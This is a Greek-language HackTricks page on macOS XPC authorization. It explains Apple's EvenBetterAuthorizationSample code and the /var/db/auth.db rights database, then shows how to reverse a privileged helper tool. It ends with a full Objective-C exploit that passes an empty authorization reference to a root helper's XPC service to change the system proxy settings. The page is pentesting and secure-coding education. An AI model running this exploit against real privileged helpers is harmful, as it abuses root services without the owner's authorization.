# macOS XPC Εξουσιοδότηση

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## XPC Εξουσιοδότηση

Η Apple προτείνει επίσης έναν άλλο τρόπο για να ελέγξει αν η συνδεόμενη διαδικασία έχει **δικαιώματα να καλέσει μια εκτεθειμένη μέθοδο XPC**.

Όταν μια εφαρμογή χρειάζεται να **εκτελέσει ενέργειες ως προνομιούχος χρήστης**, αντί να εκτελεί την εφαρμογή ως προνομιούχος χρήστης, συνήθως εγκαθιστά ως ρίζα ένα HelperTool ως υπηρεσία XPC που μπορεί να κληθεί από την εφαρμογή για να εκτελέσει αυτές τις ενέργειες. Ωστόσο, η εφαρμογή που καλεί την υπηρεσία πρέπει να έχει επαρκή εξουσιοδότηση.

### Πάντα YES στο ShouldAcceptNewConnection

Ένα παράδειγμα μπορεί να βρεθεί στο [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Στο `App/AppDelegate.m` προσπαθεί να **συνδεθεί** με το **HelperTool**. Και στο `HelperTool/HelperTool.m` η λειτουργία **`shouldAcceptNewConnection`** **δεν θα ελέγξει** καμία από τις προηγούμενα αναφερθείσες απαιτήσεις. Θα επιστρέψει πάντα YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Για περισσότερες πληροφορίες σχετικά με το πώς να ρυθμίσετε σωστά αυτόν τον έλεγχο:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### Δικαιώματα εφαρμογής

Ωστόσο, όταν καλείται μια μέθοδος από το HelperTool, υπάρχει κάποια **εξουσιοδότηση**.

Η συνάρτηση **`applicationDidFinishLaunching`** από το `App/AppDelegate.m` θα δημιουργήσει μια κενή αναφορά εξουσιοδότησης αφού η εφαρμογή έχει ξεκινήσει. Αυτό πρέπει να λειτουργεί πάντα.\
Στη συνέχεια, θα προσπαθήσει να **προσθέσει κάποια δικαιώματα** σε αυτήν την αναφορά εξουσιοδότησης καλώντας το `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Η λειτουργία `setupAuthorizationRights` από το `Common/Common.m` θα αποθηκεύσει στη βάση δεδομένων εξουσιοδότησης `/var/db/auth.db` τα δικαιώματα της εφαρμογής. Σημειώστε ότι θα προσθέσει μόνο τα δικαιώματα που δεν υπάρχουν ακόμα στη βάση δεδομένων:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Η λειτουργία `enumerateRightsUsingBlock` είναι αυτή που χρησιμοποιείται για να λάβετε τα δικαιώματα εφαρμογών, τα οποία ορίζονται στο `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Αυτό σημαίνει ότι στο τέλος αυτής της διαδικασίας, οι άδειες που δηλώνονται μέσα στο `commandInfo` θα αποθηκευτούν στο `/var/db/auth.db`. Σημειώστε ότι μπορείτε να βρείτε για **κάθε μέθοδο** που απαιτεί **πιστοποίηση**, το **όνομα άδειας** και το **`kCommandKeyAuthRightDefault`**. Το τελευταίο **υποδηλώνει ποιος μπορεί να λάβει αυτήν την άδεια**.

Υπάρχουν διαφορετικές εμβέλειες για να υποδείξουν ποιος μπορεί να έχει πρόσβαση σε μια άδεια. Κάποιες από αυτές έχουν οριστεί στο [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) (μπορείτε να βρείτε [όλες εδώ](https://www.dssw.co.uk/reference/authorization-rights/)), αλλά συνοψίζοντας:

<table><thead><tr><th width="284.3333333333333">Όνομα</th><th width="165">Τιμή</th><th>Περιγραφή</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Οποιοσδήποτε</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Κανείς</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Ο τρέχων χρήστης πρέπει να είναι διαχειριστής (μέσα στην ομάδα διαχειριστών)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Ζητήστε από τον χρήστη να πιστοποιηθεί.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Ζητήστε από τον χρήστη να πιστοποιηθεί. Πρέπει να είναι διαχειριστής (μέσα στην ομάδα διαχειριστών)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Καθορίστε κανόνες</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Καθορίστε μερικά επιπλέον σχόλια στην άδεια</td></tr></tbody></table>

### Επαλήθευση Δικαιωμάτων

Στο `HelperTool/HelperTool.m` η συνάρτηση **`readLicenseKeyAuthorization`** ελέγχει αν ο καλούντας έχει δικαίωμα να **εκτελέσει τέτοια μέθοδο** καλώντας τη συνάρτηση **`checkAuthorization`**. Αυτή η συνάρτηση θα ελέγξει αν τα **authData** που στέλνει η καλούσα διαδικασία έχουν **σωστή μορφή** και στη συνέχεια θα ελέγξει **τι απαιτείται για να αποκτήσει το δικαίωμα** να καλέσει τη συγκεκριμένη μέθοδο. Αν όλα πάνε καλά, το **επιστρεφόμενο `σφάλμα` θα είναι `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Σημειώστε ότι για να **ελέγξετε τις απαιτήσεις για να έχετε το δικαίωμα** να καλέσετε αυτήν τη μέθοδο, η συνάρτηση `authorizationRightForCommand` θα ελέγξει απλώς το αντικείμενο σχολίου **`commandInfo`**. Στη συνέχεια, θα καλέσει το **`AuthorizationCopyRights`** για να ελέγξει **αν έχει τα δικαιώματα** να καλέσει τη συνάρτηση (σημειώστε ότι οι σημαίες επιτρέπουν την αλληλεπίδραση με τον χρήστη).

Σε αυτήν την περίπτωση, για να καλέσετε τη συνάρτηση `readLicenseKeyAuthorization`, το `kCommandKeyAuthRightDefault` ορίζεται σε `@kAuthorizationRuleClassAllow`. Έτσι **οποιοσδήποτε μπορεί να το καλέσει**.

### Πληροφορίες ΒΔ

Αναφέρθηκε ότι αυτές οι πληροφορίες αποθηκεύονται στο `/var/db/auth.db`. Μπορείτε να εμφανίσετε όλους τους αποθηκευμένους κανόνες με:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Στη συνέχεια, μπορείτε να διαβάσετε ποιος μπορεί να έχει πρόσβαση στο δικαίωμα με:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Δικαιώματα περιβαλλοντικής επιτροπής

Μπορείτε να βρείτε **όλες τις διαμορφώσεις δικαιωμάτων** [**εδώ**](https://www.dssw.co.uk/reference/authorization-rights/), αλλά οι συνδυασμοί που δεν απαιτούν αλληλεπίδραση με τον χρήστη θα είναι:

1. **'authenticate-user': 'false'**
* Αυτό είναι το πιο άμεσο κλειδί. Εάν οριστεί σε `false`, υποδηλώνει ότι ένας χρήστης δεν χρειάζεται να παρέχει πιστοποίηση για να αποκτήσει αυτό το δικαίωμα.
* Χρησιμοποιείται σε **συνδυασμό με ένα από τα 2 παρακάτω ή υποδεικνύοντας μια ομάδα** στην οποία πρέπει να ανήκει ο χρήστης.
2. **'allow-root': 'true'**
* Εάν ένας χρήστης λειτουργεί ως ριζικός χρήστης (που έχει αναβαθμισμένα δικαιώματα) και αυτό το κλειδί ορίζεται σε `true`, ο ριζικός χρήστης θα μπορούσε πιθανόν να αποκτήσει αυτό το δικαίωμα χωρίς περαιτέρω πιστοποίηση. Ωστόσο, συνήθως, η επίτευξη κατάστασης ριζικού χρήστη ήδη απαιτεί πιστοποίηση, οπότε αυτό δεν είναι ένα σενάριο "χωρίς πιστοποίηση" για τους περισσότερους χρήστες.
3. **'session-owner': 'true'**
* Εάν οριστεί σε `true`, ο ιδιοκτήτης της συνεδρίας (ο χρήστης που έχει συνδεθεί επί του παρόντος) θα αποκτήσει αυτόματα αυτό το δικαίωμα. Αυτό ενδέχεται να παρακάμψει επιπλέον πιστοποίηση εάν ο χρήστης έχει ήδη συνδεθεί.
4. **'shared': 'true'**
* Αυτό το κλειδί δεν χορηγεί δικαιώματα χωρίς πιστοποίηση. Αντίθετα, εάν οριστεί σε `true`, σημαίνει ότι αφού έχει πιστοποιηθεί το δικαίωμα, μπορεί να μοιραστεί μεταξύ πολλαπλών διεργασιών χωρίς κάθε μία να χρειάζεται να επαναπιστοποιηθεί. Ωστόσο, η αρχική χορήγηση του δικαιώματος θα εξακολουθεί να απαιτεί πιστοποίηση εκτός εάν συνδυαστεί με άλλα κλειδιά όπως `'authenticate-user': 'false'`.
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Αναστροφή Εξουσιοδότησης

### Έλεγχος αν χρησιμοποιείται το EvenBetterAuthorization

Αν βρείτε τη συνάρτηση: **`[HelperTool checkAuthorization:command:]`** τότε πιθανόν η διαδικασία χρησιμοποιεί το προηγούμενα αναφερθέν σχήμα για εξουσιοδότηση:

<figure><img src="../../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Σε αυτήν την περίπτωση, αν αυτή η συνάρτηση καλεί συναρτήσεις όπως `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, τότε χρησιμοποιεί το [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Ελέγξτε το **`/var/db/auth.db`** για να δείτε αν είναι δυνατή η απόκτηση δικαιωμάτων για να καλέσετε κάποια προνομιούχη ενέργεια χωρίς αλληλεπίδραση με τον χρήστη.

### Επικοινωνία Πρωτοκόλλου

Στη συνέχεια, πρέπει να βρείτε το σχήμα πρωτοκόλλου προκειμένου να είστε σε θέση να καθιερώσετε μια επικοινωνία με την υπηρεσία XPC.

Η συνάρτηση **`shouldAcceptNewConnection`** υποδηλώνει το πρωτόκολλο που εξάγεται:

<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Σε αυτήν την περίπτωση, έχουμε το ίδιο με το EvenBetterAuthorizationSample, [**ελέγξτε αυτήν τη γραμμή**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Γνωρίζοντας το όνομα του χρησιμοποιούμενου πρωτοκόλλου, είναι δυνατόν να **ανακτήσετε τον ορισμό του κεφαλίδας** με:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Τέλος, χρειάζεται απλώς να γνωρίζουμε το **όνομα της εκθεσμένης Υπηρεσίας Mach** για να εγκαθιδρύσουμε μια επικοινωνία μαζί της. Υπάρχουν διάφοροι τρόποι να βρεθεί αυτό:

* Στο **`[HelperTool init]`** όπου μπορείτε να δείτε την Υπηρεσία Mach που χρησιμοποιείται:

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* Στο launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Παράδειγμα Εκμετάλλευσης

Σε αυτό το παράδειγμα δημιουργούνται:

* Η ορισμός του πρωτοκόλλου με τις συναρτήσεις
* Ένα κενό αυθεντικοποίησης για να ζητηθεί πρόσβαση
* Μια σύνδεση με την υπηρεσία XPC
* Μια κλήση στη συνάρτηση εάν η σύνδεση ήταν επιτυχής
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Αναφορές

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
